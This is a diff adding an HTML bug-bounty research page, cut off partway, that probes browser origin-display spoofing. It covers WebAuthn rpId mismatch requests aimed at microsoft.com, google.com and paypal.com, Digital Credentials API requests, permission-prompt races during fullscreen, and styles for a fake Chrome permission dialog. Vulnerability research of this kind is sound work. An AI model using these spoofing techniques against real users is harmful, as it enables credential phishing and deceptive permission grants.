@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Origin Spoof PoC Lab — VRP Research</title>
+<style>
+:root{
+  --bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;
+  --text:#c9d1d9;--dim:#8b949e;--blue:#58a6ff;--blue2:#79c0ff;
+  --red:#ff7b72;--orange:#ffa657;--yellow:#e3b341;--green:#56d364;--purple:#bc8cff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;line-height:1.6}
+h1{color:var(--blue2);font-size:19px;font-weight:800}
+h2{color:var(--blue);font-size:14px;font-weight:700;margin-bottom:8px}
+h3{color:var(--text);font-size:13px;font-weight:600;margin-bottom:6px}
+code{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-family:monospace;font-size:12px;color:var(--orange)}
+pre{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;font-size:12px;overflow-x:auto;line-height:1.8;white-space:pre-wrap}
+a{color:var(--blue);text-decoration:none}
+
+/* Layout */
+.layout{display:flex;min-height:100vh}
+.sidebar{width:240px;min-height:100vh;background:var(--bg2);border-right:1px solid var(--border);padding:16px 0;position:fixed;top:0;left:0;overflow-y:auto}
+.main{margin-left:240px;padding:24px 32px;max-width:960px}
+
+/* Sidebar */
+.nav-brand{padding:0 14px 14px;border-bottom:1px solid var(--border);margin-bottom:10px}
+.nav-brand .title{color:var(--blue2);font-weight:800;font-size:13px}
+.nav-brand .sub{color:var(--dim);font-size:10px;margin-top:2px}
+.nav-section{padding:10px 14px 3px;color:var(--dim);font-size:9px;text-transform:uppercase;letter-spacing:.8px}
+.nav-item{display:block;padding:5px 14px;color:var(--dim);font-size:12px;border-left:2px solid transparent;transition:all .15s;cursor:pointer}
+.nav-item:hover{color:var(--text);background:var(--bg3);border-left-color:var(--blue)}
+.nav-item.active{color:var(--blue);border-left-color:var(--blue);background:var(--bg3)}
+
+/* Cards */
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px 22px;margin-bottom:16px}
+.card-hdr{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.badge{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:2px 9px;font-family:monospace;font-size:11px;font-weight:700;color:var(--blue)}
+.rb{font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;white-space:nowrap}
+.rb-r{background:#3d0000;color:var(--red)}
+.rb-g{background:#0d2d00;color:var(--green)}
+.rb-o{background:#2d1500;color:var(--orange)}
+.rb-y{background:#2d2200;color:var(--yellow)}
+.rb-p{background:#1a0a3d;color:var(--purple)}
+
+/* Buttons */
+.btn{padding:7px 14px;border:1px solid var(--border);border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text);transition:all .15s;font-family:inherit}
+.btn:hover{border-color:var(--blue);color:var(--blue)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-r{background:#3d0000;border-color:var(--red);color:var(--red)}
+.btn-r:hover{background:#5a0000}
+.btn-g{background:#0d2d00;border-color:var(--green);color:var(--green)}
+.btn-g:hover{background:#134000}
+.btn-p{background:#1a0a3d;border-color:var(--purple);color:var(--purple)}
+.btn-p:hover{background:#2a1050}
+.btn-o{background:#2d1500;border-color:var(--orange);color:var(--orange)}
+.btn-sm{padding:4px 10px;font-size:11px}
+.bgroup{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+
+/* Alerts */
+.alert{border-radius:6px;padding:9px 13px;margin:8px 0;font-size:12px;line-height:1.6}
+.a-r{background:#3d0000;border:1px solid #b91c1c;color:var(--red)}
+.a-y{background:#2d2200;border:1px solid #9e6a03;color:var(--yellow)}
+.a-b{background:#0c2a4a;border:1px solid #1f6feb;color:var(--blue2)}
+.a-g{background:#0d2d00;border:1px solid #2ea043;color:var(--green)}
+.a-p{background:#1a0a3d;border:1px solid #6e40c9;color:var(--purple)}
+
+/* Log */
+.log{background:#010409;border:1px solid var(--border);border-radius:5px;padding:8px 11px;font-family:monospace;font-size:11px;min-height:40px;max-height:160px;overflow-y:auto;margin-top:8px}
+.ll-g{color:var(--green)}.ll-y{color:var(--yellow)}.ll-r{color:var(--red)}.ll-b{color:var(--blue)}.ll-d{color:var(--dim)}.ll-p{color:var(--purple)}
+
+/* Tabs */
+.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:14px;flex-wrap:wrap}
+.tab{padding:6px 14px;font-size:12px;cursor:pointer;color:var(--dim);border-bottom:2px solid transparent;margin-bottom:-1px;font-weight:600;transition:all .15s}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--blue);border-bottom-color:var(--blue)}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+
+/* Status chips */
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+.chip{padding:4px 12px;border-radius:20px;font-size:11px;font-family:monospace;border:1px solid var(--border);color:var(--dim);background:var(--bg3)}
+.chip.ok{border-color:var(--green);color:var(--green)}
+.chip.err{border-color:var(--red);color:var(--red)}
+.chip.warn{border-color:var(--yellow);color:var(--yellow)}
+.chip.info{border-color:var(--blue);color:var(--blue)}
+
+/* Result banner */
+.result-banner{display:none;padding:10px 16px;border-radius:6px;font-family:monospace;font-size:13px;font-weight:700;margin-top:10px;border:2px solid}
+.result-banner.bypass{background:#0d2d00;border-color:var(--green);color:var(--green)}
+.result-banner.patched{background:#3d0000;border-color:var(--red);color:var(--red)}
+.result-banner.partial{background:#2d2200;border-color:var(--yellow);color:var(--yellow)}
+.result-banner.pending{background:#0c2a4a;border-color:var(--blue);color:var(--blue)}
+
+/* Grid */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+
+/* Fullscreen fake UI */
+#fs-overlay{display:none;position:fixed;inset:0;background:#f1f3f4;z-index:999999;flex-direction:column}
+#fs-toolbar{background:#fff;border-bottom:1px solid #dadce0;height:52px;display:flex;align-items:center;padding:0 12px;gap:10px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+#fs-urlbar{flex:1;background:#f1f3f4;border:1px solid #dadce0;border-radius:22px;padding:7px 16px;display:flex;align-items:center;gap:8px;font-size:14px}
+#fs-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px;overflow:auto}
+.perm-overlay{position:fixed;top:52px;left:50%;transform:translateX(-50%);background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 24px;width:360px;box-shadow:0 4px 20px rgba(0,0,0,.15);z-index:9999999;display:none}
+.perm-overlay h4{font-size:14px;color:#202124;margin-bottom:8px}
+.perm-overlay p{font-size:13px;color:#5f6368;margin-bottom:14px}
+.perm-overlay .origin{font-weight:700;color:#202124}
+.perm-row{display:flex;gap:8px;justify-content:flex-end}
+.perm-btn{padding:8px 18px;border-radius:4px;border:none;cursor:pointer;font-size:13px;font-weight:500}
+.perm-allow{background:#1a73e8;color:#fff}
+.perm-deny{background:transparent;color:#1a73e8}
+
+.divider{border:none;border-top:1px solid var(--border);margin:20px 0}
+.mono{font-family:monospace}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{background:var(--bg3);padding:7px 11px;text-align:left;color:var(--dim);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.6px;border-bottom:1px solid var(--border)}
+td{padding:7px 11px;border-bottom:1px solid var(--border);vertical-align:middle}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+<div class="layout">
+
+<!-- ═══════════════ SIDEBAR ═══════════════ -->
+<nav class="sidebar">
+  <div class="nav-brand">
+    <div class="title">Origin Spoof PoC Lab</div>
+    <div class="sub">Chrome/Firefox VRP Research · 2026</div>
+  </div>
+  <div class="nav-section">Overview</div>
+  <div class="nav-item active" onclick="showSection('overview')">📊 Dashboard</div>
+  <div class="nav-section">Vector 1 — WebAuthn</div>
+  <div class="nav-item" onclick="showSection('v1')">🔑 V1a: rpId Mismatch</div>
+  <div class="nav-item" onclick="showSection('v1b')">🔑 V1b: Subdomain rpId</div>
+  <div class="nav-item" onclick="showSection('v1c')">🔑 V1c: Conditional UI</div>
+  <div class="nav-section">Vector 2 — Digital Creds</div>
+  <div class="nav-item" onclick="showSection('v2')">🪪 V2a: API Detection</div>
+  <div class="nav-item" onclick="showSection('v2b')">🪪 V2b: OpenID4VP</div>
+  <div class="nav-item" onclick="showSection('v2c')">🪪 V2c: mDL Request</div>
+  <div class="nav-section">Vector 3 — Perm+Fullscreen</div>
+  <div class="nav-item" onclick="showSection('v3a')">🔔 V3a: Notify Race</div>
+  <div class="nav-item" onclick="showSection('v3b')">📷 V3b: Camera Race</div>
+  <div class="nav-item" onclick="showSection('v3c')">📍 V3c: Geo Race</div>
+  <div class="nav-item" onclick="showSection('v3d')">⚡ V3d: Stack Perms</div>
+  <div class="nav-item" onclick="showSection('v3e')">🎭 V3e: Fake Perm UI</div>
+  <div class="nav-section">Utilities</div>
+  <div class="nav-item" onclick="showSection('env')">🔍 Environment Check</div>
+  <div class="nav-item" onclick="showSection('notes')">📋 Notes</div>
+</nav>
+
+<!-- ═══════════════ MAIN ═══════════════ -->
+<main class="main">
+
+<!-- ══════ OVERVIEW ══════ -->
+<div id="sec-overview" class="section">
+  <div style="margin-bottom:20px;padding-bottom:14px;border-bottom:1px solid var(--border)">
+    <h1>Origin Spoof PoC Lab</h1>
+    <p style="color:var(--dim);font-size:13px;margin-top:5px">3 vector utama: WebAuthn rpId · Digital Credentials API · Permission+Fullscreen timing</p>
+  </div>
+
+  <div class="grid3" style="margin-bottom:16px">
+    <div class="card" style="border-color:var(--blue);cursor:pointer" onclick="showSection('v1')">
+      <div style="font-size:24px;margin-bottom:8px">🔑</div>
+      <div style="font-weight:700;color:var(--blue);margin-bottom:4px">WebAuthn rpId</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:8px">Origin display di credential picker / autofill dropdown</div>
+      <span class="rb rb-r">$5k–$10k</span>
+      <div id="v1-status" class="chip" style="margin-top:8px;display:inline-block">—</div>
+    </div>
+    <div class="card" style="border-color:var(--purple);cursor:pointer" onclick="showSection('v2')">
+      <div style="font-size:24px;margin-bottom:8px">🪪</div>
+      <div style="font-weight:700;color:var(--purple);margin-bottom:4px">Digital Credentials</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:8px">API baru Chrome 128+ untuk identity documents</div>
+      <span class="rb rb-p">$3k–$5k</span>
+      <div id="v2-status" class="chip" style="margin-top:8px;display:inline-block">—</div>
+    </div>
+    <div class="card" style="border-color:var(--orange);cursor:pointer" onclick="showSection('v3a')">
+      <div style="font-size:24px;margin-bottom:8px">🔔</div>
+      <div style="font-weight:700;color:var(--orange);margin-bottom:4px">Perm + Fullscreen</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:8px">Permission dialog saat fullscreen — origin hilang?</div>
+      <span class="rb rb-o">$3k–$5k</span>
+      <div id="v3-status" class="chip" style="margin-top:8px;display:inline-block">—</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-hdr"><span class="badge">BUG HYPOTHESIS</span></div>
+    <table>
+      <thead><tr><th>Vector</th><th>Bug Class</th><th>Yang Dicari</th><th>Chrome VRP Category</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>WebAuthn rpId</strong></td>
+          <td>Origin display mismatch</td>
+          <td>Credential picker menampilkan rpId berbeda dari page origin</td>
+          <td>Inappropriate implementation · $3k–$5k</td>
+        </tr>
+        <tr>
+          <td><strong>Digital Creds API</strong></td>
+          <td>New API origin confusion</td>
+          <td>System dialog menampilkan origin yang salah / dapat di-spoof</td>
+          <td>Security UI spoof · $3k–$5k</td>
+        </tr>
+        <tr>
+          <td><strong>Perm + Fullscreen</strong></td>
+          <td>Origin label missing</td>
+          <td>Permission dialog muncul tanpa origin label saat fullscreen transisi</td>
+          <td>Permission dialog bypass · $3k–$5k</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="alert a-y">
+    <strong>Sebelum test:</strong> Buka Environment Check (sidebar bawah) untuk verifikasi browser support masing-masing API. Beberapa vector butuh HTTPS.
+    Current origin: <code id="current-origin">—</code>
+  </div>
+  <script>document.getElementById('current-origin').textContent = location.origin;</script>
+
+  <button class="btn btn-g" onclick="runAllChecks()">▶ Run All Environment Checks</button>
+  <div class="log" id="overview-log"><span class="ll-b">→ Klik "Run All" atau pilih vector dari sidebar.</span></div>
+</div>
+
+<!-- ══════ V1a — WebAuthn rpId Mismatch ══════ -->
+<div id="sec-v1" class="section" style="display:none">
+  <div class="card" style="border-color:var(--blue)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--blue)">V1a</span>
+      <span class="rb rb-r">$5k–$10k</span>
+      <h2 style="margin-bottom:0">WebAuthn — rpId Mismatch Display</h2>
+    </div>
+
+    <div class="alert a-b">
+      <strong>Hypothesis:</strong> Saat <code>navigator.credentials.get()</code> dipanggil dengan
+      <code>rpId</code> yang berbeda dari page origin, browser mungkin menampilkan rpId (bukan actual origin)
+      di credential picker UI / autofill dropdown. User melihat "microsoft.com" padahal ada di halaman attacker.
+    </div>
+
+    <div class="grid2" style="margin:12px 0">
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:12px">
+        <div style="font-size:11px;color:var(--dim);text-transform:uppercase;margin-bottom:8px">Attack scenario</div>
+        <div style="font-size:12px;color:var(--dim);line-height:2">
+          1. User punya passkey di <code>microsoft.com</code><br>
+          2. Attacker page request credential dengan<br>
+          &nbsp;&nbsp;&nbsp;<code>rpId: "microsoft.com"</code><br>
+          3. Browser menampilkan "microsoft.com" di picker<br>
+          4. User mengira mereka login ke microsoft.com<br>
+          5. Credential diserahkan ke attacker
+        </div>
+      </div>
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:12px">
+        <div style="font-size:11px;color:var(--orange);text-transform:uppercase;margin-bottom:8px">Chrome defense</div>
+        <div style="font-size:12px;color:var(--dim);line-height:2">
+          Chrome validasi: <code>rpId</code> harus suffix dari<br>
+          effective domain halaman saat ini.<br>
+          <br>
+          Dari <code>evil.com</code> → <code>rpId: "microsoft.com"</code><br>
+          → <strong style="color:var(--red)">SecurityError: DOMException</strong><br>
+          <br>
+          TAPI: edge case di subdomain, cross-origin<br>
+          iframe, atau error message yang leak info?
+        </div>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('v1','basic')">Basic Test</div>
+      <div class="tab" onclick="switchTab('v1','subdomain')">Subdomain Attack</div>
+      <div class="tab" onclick="switchTab('v1','iframe')">Cross-Origin iframe</div>
+      <div class="tab" onclick="switchTab('v1','create')">Create + Get</div>
+    </div>
+
+    <div id="v1-basic" class="tab-panel active">
+      <h3>Test: rpId mismatch dari origin ini</h3>
+      <pre id="v1-code-basic">navigator.credentials.get({
+  publicKey: {
+    rpId: "microsoft.com",   // ← SPOOF TARGET
+    challenge: crypto.getRandomValues(new Uint8Array(32)),
+    allowCredentials: [],
+    userVerification: "discouraged",
+    timeout: 5000
+  }
+});</pre>
+      <div class="chips">
+        <div class="chip" id="chip-v1-webauthn">WebAuthn: checking...</div>
+        <div class="chip" id="chip-v1-https">HTTPS: <span id="v1-https-val">—</span></div>
+      </div>
+      <div class="bgroup">
+        <button class="btn btn-r" onclick="testWebAuthnBasic('microsoft.com')">Test rpId: microsoft.com</button>
+        <button class="btn btn-r" onclick="testWebAuthnBasic('google.com')">Test rpId: google.com</button>
+        <button class="btn btn-r" onclick="testWebAuthnBasic('paypal.com')">Test rpId: paypal.com</button>
+        <button class="btn btn-sm" onclick="testWebAuthnBasic(location.hostname)">Test rpId: this origin (should work)</button>
+      </div>
+      <div class="log" id="v1-log-basic"><span class="ll-b">→ Click a button to test.</span></div>
+      <div class="result-banner" id="v1-result-basic"></div>
+    </div>
+
+    <div id="v1-subdomain" class="tab-panel">
+      <h3>Test: Subdomain rpId</h3>
+      <div class="alert a-y" style="margin-bottom:10px">
+        Dari <code>sub.example.com</code>, <code>rpId: "example.com"</code> adalah VALID (eTLD+1 suffix rule).
+        Bug: apakah picker menampilkan "example.com" tanpa menyebutkan actual page adalah "sub.example.com"?
+      </div>
+      <pre>// Dari sub.attacker.com:
+navigator.credentials.get({
+  publicKey: {
+    rpId: "attacker.com",    // ← valid secara spec (suffix match)
+    challenge: crypto.getRandomValues(new Uint8Array(32)),
+    allowCredentials: [],
+  }
+});
+// Q: picker menampilkan "attacker.com" atau "sub.attacker.com"?</pre>
+      <button class="btn btn-r" onclick="testWebAuthnSubdomain()">Test Subdomain rpId</button>
+      <div class="log" id="v1-log-sub"><span class="ll-b">→ Test subdomain rpId behavior.</span></div>
+    </div>
+
+    <div id="v1-iframe" class="tab-panel">
+      <h3>Test: Cross-Origin iframe trigger</h3>
+      <div class="alert a-y" style="margin-bottom:10px">
+        WebAuthn dari cross-origin iframe membutuhkan <code>allow="publickey-credentials-get"</code>.
+        Apakah picker menampilkan iframe origin atau top-level origin?
+      </div>
+      <pre>// parent.html di evil.com:
+&lt;iframe src="https://iframe.evil.com/webauthn.html"
+        allow="publickey-credentials-get"&gt;&lt;/iframe&gt;
+
+// iframe.evil.com/webauthn.html:
+navigator.credentials.get({
+  publicKey: {
+    rpId: "evil.com",   // top-level parent origin
+    challenge: ...,
+    allowCredentials: []
+  }
+});
+// Q: picker origin label = "evil.com" atau "iframe.evil.com"?</pre>
+      <button class="btn btn-r" onclick="testWebAuthnIframe()">Create iframe Test</button>
+      <div class="log" id="v1-log-iframe"><span class="ll-b">→ Test iframe origin display.</span></div>
+    </div>
+
+    <div id="v1-create" class="tab-panel">
+      <h3>Test: Create credential → Get with display observation</h3>
+      <div class="alert a-b" style="margin-bottom:10px">
+        Create passkey di origin ini, lalu observe apa yang ditampilkan browser di
+        credential picker. Apakah UI menampilkan rpId atau actual origin?
+      </div>
+      <pre>// Step 1: Create credential
+navigator.credentials.create({
+  publicKey: {
+    rp: { id: location.hostname, name: "Test Relying Party" },
+    user: { id: new Uint8Array(16), name: "test@test.com", displayName: "Test User" },
+    challenge: crypto.getRandomValues(new Uint8Array(32)),
+    pubKeyCredParams: [{ type: "public-key", alg: -7 }]
+  }
+});
+
+// Step 2: Get credential — observe picker UI</pre>
+      <div class="bgroup">
+        <button class="btn btn-p" onclick="createWebAuthnCred()">Step 1: Create Credential</button>
+        <button class="btn btn-r" id="btn-get-cred" onclick="getWebAuthnCred()" disabled>Step 2: Get + Observe</button>
+      </div>
+      <div class="log" id="v1-log-create"><span class="ll-b">→ Step 1 dulu, lalu Step 2.</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════ V1b — Subdomain rpId ══════ -->
+<div id="sec-v1b" class="section" style="display:none">
+  <div class="card">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--blue)">V1b</span>
+      <h2 style="margin-bottom:0">WebAuthn — Conditional Mediation (Autofill)</h2>
+    </div>
+    <div class="alert a-b">
+      <strong>Conditional UI</strong> = passkey muncul di autofill dropdown input field (bukan popup modal).
+      Ini lebih subtle dari modal — apakah origin label terlihat di autofill suggestion?
+    </div>
+    <pre>// Trigger conditional mediation — passkey di autofill
+navigator.credentials.get({
+  mediation: "conditional",
+  publicKey: {
+    challenge: crypto.getRandomValues(new Uint8Array(32)),
+    allowCredentials: [],
+    rpId: location.hostname
+  }
+});
+// Lihat: apakah autofill suggestion menampilkan origin?
+// Atau hanya username tanpa clear origin attribution?</pre>
+    <div style="margin:12px 0">
+      <input type="email" id="autofill-input" autocomplete="username webauthn"
+        placeholder="Klik di sini — lalu lihat autofill suggestion"
+        style="width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:14px;font-family:inherit;outline:none">
+    </div>
+    <button class="btn btn-p" onclick="testConditionalUI()">Trigger Conditional WebAuthn</button>
+    <div class="log" id="v1b-log"><span class="ll-b">→ Klik input field setelah trigger untuk lihat autofill.</span></div>
+  </div>
+</div>
+
+<!-- ══════ V1c — Conditional UI ══════ -->
+<div id="sec-v1c" class="section" style="display:none">
+  <div class="card">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--blue)">V1c</span>
+      <h2 style="margin-bottom:0">WebAuthn — Error Message Origin Leak</h2>
+    </div>
+    <div class="alert a-b">
+      Saat WebAuthn gagal dengan SecurityError, error message mungkin mengandung informasi
+      tentang allowed rpIds atau internal browser state yang bisa digunakan untuk recon.
+    </div>
+    <button class="btn btn-r" onclick="testWebAuthnErrors()">Test All Error Cases</button>
+    <div class="log" id="v1c-log"><span class="ll-b">→ Ready.</span></div>
+  </div>
+</div>
+
+<!-- ══════ V2a — Digital Credentials API ══════ -->
+<div id="sec-v2" class="section" style="display:none">
+  <div class="card" style="border-color:var(--purple)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--purple)">V2a</span>
+      <span class="rb rb-p">Chrome 128+ · New API</span>
+      <h2 style="margin-bottom:0">Digital Credentials API — Detection</h2>
+    </div>
+
+    <div class="alert a-p">
+      <strong>Digital Credentials API</strong> memungkinkan website meminta dokumen identitas digital
+      (KTP, SIM, passport) dari digital wallet di device. Chrome 128+ mengimplementasikan ini.
+      API baru = kemungkinan besar belum ada yang riset origin display bugs-nya.
+    </div>
+
+    <div class="grid2" style="margin:12px 0">
+      <div style="background:var(--bg3);border:1px solid #6e40c9;border-radius:7px;padding:12px">
+        <div style="font-size:11px;color:var(--purple);text-transform:uppercase;margin-bottom:8px">Origin Display Bug Hypothesis</div>
+        <div style="font-size:12px;color:var(--dim);line-height:2">
+          System dialog meminta izin akses digital ID.<br>
+          Apakah dialog menampilkan:<br>
+          &nbsp;• Origin yang benar (requesting page)?<br>
+          &nbsp;• Atau bisa di-spoof via iframe/redirect?<br>
+          &nbsp;• Atau tidak menampilkan origin sama sekali?
+        </div>
+      </div>
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:12px">
+        <div style="font-size:11px;color:var(--dim);text-transform:uppercase;margin-bottom:8px">API Status</div>
+        <div class="chips" style="margin:0;flex-direction:column;gap:6px">
+          <div class="chip" id="chip-digital-creds">navigator.credentials.get({digital}): checking...</div>
+          <div class="chip" id="chip-digital-flag">Chrome flag required: checking...</div>
+          <div class="chip" id="chip-digital-https">Secure context: <span id="digital-https">—</span></div>
+        </div>
+      </div>
+    </div>
+
+    <button class="btn btn-p" onclick="checkDigitalCredsAPI()">Check API Availability</button>
+    <div class="log" id="v2-log"><span class="ll-b">→ Check API dulu.</span></div>
+    <div class="result-banner" id="v2-result"></div>
+
+    <div class="alert a-y" style="margin-top:12px">
+      <strong>Cara enable di Chrome:</strong><br>
+      <code>chrome://flags/#web-identity-digital-credentials</code> → Enable<br>
+      Atau launch Chrome dengan: <code>--enable-features=WebIdentityDigitalCredentials</code>
+    </div>
+  </div>
+</div>
+
+<!-- ══════ V2b — OpenID4VP ══════ -->
+<div id="sec-v2b" class="section" style="display:none">
+  <div class="card" style="border-color:var(--purple)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--purple)">V2b</span>
+      <h2 style="margin-bottom:0">Digital Credentials — OpenID4VP Request</h2>
+    </div>
+    <pre>// OpenID4VP (OpenID for Verifiable Presentations)
+const request = {
+  digital: {
+    requests: [{
+      protocol: "openid4vp",
+      data: JSON.stringify({
+        response_type: "vp_token",
+        nonce: crypto.randomUUID(),
+        presentation_definition: {
+          id: "identity-check",
+          input_descriptors: [{
+            id: "id-card",
+            format: { mso_mdoc: { alg: ["ES256"] } },
+            constraints: {
+              fields: [{
+                path: ["$['org.iso.18013.5.1']['family_name']"],
+                intent_to_retain: false
+              }]
+            }
+          }]
+        }
+      })
+    }]
+  }
+};
+
+// Q: Dialog muncul? Origin apa yang ditampilkan?
+const credential = await navigator.credentials.get(request);</pre>
+    <div class="bgroup">
+      <button class="btn btn-p" onclick="testOpenID4VP()">Test OpenID4VP Request</button>
+      <button class="btn btn-sm" onclick="testOpenID4VP_iframe()">Test via iframe</button>
+    </div>
+    <div class="log" id="v2b-log"><span class="ll-b">→ Requires Chrome 128+ with flag enabled.</span></div>
+    <div class="result-banner" id="v2b-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V2c — mDL ══════ -->
+<div id="sec-v2c" class="section" style="display:none">
+  <div class="card" style="border-color:var(--purple)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--purple)">V2c</span>
+      <h2 style="margin-bottom:0">Digital Credentials — Mobile Driving License (mDL/ISO 18013-5)</h2>
+    </div>
+    <pre>// ISO 18013-5 mDL format via Digital Credentials API
+const credential = await navigator.credentials.get({
+  digital: {
+    requests: [{
+      protocol: "preview",  // older Chrome draft uses "preview"
+      data: {
+        selector: {
+          format: [{ designator: "mdoc" }],
+          doctype: "org.iso.18013.5.1.mDL",
+          fields: [
+            { namespace: "org.iso.18013.5.1", name: "family_name", intentToRetain: false },
+            { namespace: "org.iso.18013.5.1", name: "given_name",  intentToRetain: false },
+            { namespace: "org.iso.18013.5.1", name: "age_over_21", intentToRetain: false }
+          ]
+        },
+        nonce: crypto.randomUUID(),
+        readerPublicKey: "" // optional
+      }
+    }]
+  }
+});
+
+// Key observation:
+// 1. Does any dialog appear?
+// 2. What origin is displayed in the dialog?
+// 3. Can the origin be spoofed via iframe with allow="identity-credentials-get"?</pre>
+    <div class="bgroup">
+      <button class="btn btn-p" onclick="testMDL('preview')">Test mDL "preview" protocol</button>
+      <button class="btn btn-p" onclick="testMDL('openid4vp')">Test mDL "openid4vp" protocol</button>
+    </div>
+    <div class="log" id="v2c-log"><span class="ll-b">→ Requires device with digital wallet + Chrome 128+.</span></div>
+    <div class="result-banner" id="v2c-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V3a — Notify Race ══════ -->
+<div id="sec-v3a" class="section" style="display:none">
+  <div class="card" style="border-color:var(--orange)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--orange)">V3a</span>
+      <span class="rb rb-o">$3k–$5k</span>
+      <h2 style="margin-bottom:0">Permission + Fullscreen — Notification Race</h2>
+    </div>
+
+    <div class="alert a-y">
+      <strong>Hypothesis:</strong> Trigger <code>Notification.requestPermission()</code> saat
+      transisi masuk/keluar fullscreen. Pada window tertentu, permission dialog mungkin muncul
+      <strong>tanpa origin label</strong> karena fullscreen chrome-UI sedang berubah.
+    </div>
+
+    <div class="grid2" style="margin:12px 0">
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:12px;font-size:12px">
+        <div style="color:var(--dim);text-transform:uppercase;font-size:10px;margin-bottom:6px">Test A — Enter Fullscreen Race</div>
+        Trigger permission request <strong>simultaneously</strong> dengan requestFullscreen().<br>
+        Delay 0ms / 50ms / 100ms / 200ms.
+      </div>
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:12px;font-size:12px">
+        <div style="color:var(--dim);text-transform:uppercase;font-size:10px;margin-bottom:6px">Test B — Exit Fullscreen Race</div>
+        Trigger permission request saat <strong>exit</strong> fullscreen.<br>
+        Origin label mungkin sebentar hilang selama transisi.
+      </div>
+    </div>
+
+    <div class="chips">
+      <div class="chip" id="chip-v3a-perm">Notification: <span id="v3a-perm-val">—</span></div>
+      <div class="chip" id="chip-v3a-fs">Fullscreen API: <span id="v3a-fs-val">—</span></div>
+      <div class="chip" id="chip-v3a-esc">ESC presses: 0</div>
+    </div>
+
+    <div class="bgroup">
+      <button class="btn btn-o" onclick="testNotifyRace(0)">Race: 0ms delay</button>
+      <button class="btn btn-o" onclick="testNotifyRace(50)">Race: 50ms</button>
+      <button class="btn btn-o" onclick="testNotifyRace(200)">Race: 200ms</button>
+      <button class="btn btn-o" onclick="testNotifyRace(400)">Race: 400ms</button>
+      <button class="btn btn-sm" onclick="testNotifyExitRace()">Race: Exit Fullscreen</button>
+    </div>
+    <div class="log" id="v3a-log"><span class="ll-b">→ Ready. Click a button (user gesture required).</span></div>
+    <div class="result-banner" id="v3a-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V3b — Camera Race ══════ -->
+<div id="sec-v3b" class="section" style="display:none">
+  <div class="card" style="border-color:var(--orange)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--orange)">V3b</span>
+      <h2 style="margin-bottom:0">Permission + Fullscreen — Camera/Mic Race</h2>
+    </div>
+    <div class="alert a-y">
+      Camera/Mic permission dialogs berbeda dari Notification — mereka memblokir interaksi
+      dan menampilkan origin lebih prominently. Apakah race masih bisa menghilangkan origin label?
+    </div>
+    <div class="bgroup">
+      <button class="btn btn-o" onclick="testMediaRace('camera',0)">Camera: 0ms</button>
+      <button class="btn btn-o" onclick="testMediaRace('camera',100)">Camera: 100ms</button>
+      <button class="btn btn-o" onclick="testMediaRace('mic',0)">Mic: 0ms</button>
+      <button class="btn btn-o" onclick="testMediaRace('both',50)">Camera+Mic: 50ms</button>
+    </div>
+    <div class="log" id="v3b-log"><span class="ll-b">→ Ready.</span></div>
+    <div class="result-banner" id="v3b-result"></div>
+  </div>
+</div>
+
+<!-- ══════ V3c — Geo Race ══════ -->
+<div id="sec-v3c" class="section" style="display:none">
+  <div class="card" style="border-color:var(--orange)">
+    <div class="card-hdr">
+      <span class="badge" style="color:var(--orange)">V3c</span>
+      <h2 style="margin-bottom:0">Permission + Fullscreen — Geolocation Race</h2>
+    </div>
+    <div class="alert a-y">
+      Geolocation permission dialog timing berbeda karena bisa muncul
+      dengan delay setelah <code>getCurrentPosition()</code> dipanggil.
+    </div>
+    <div class="bgroup">
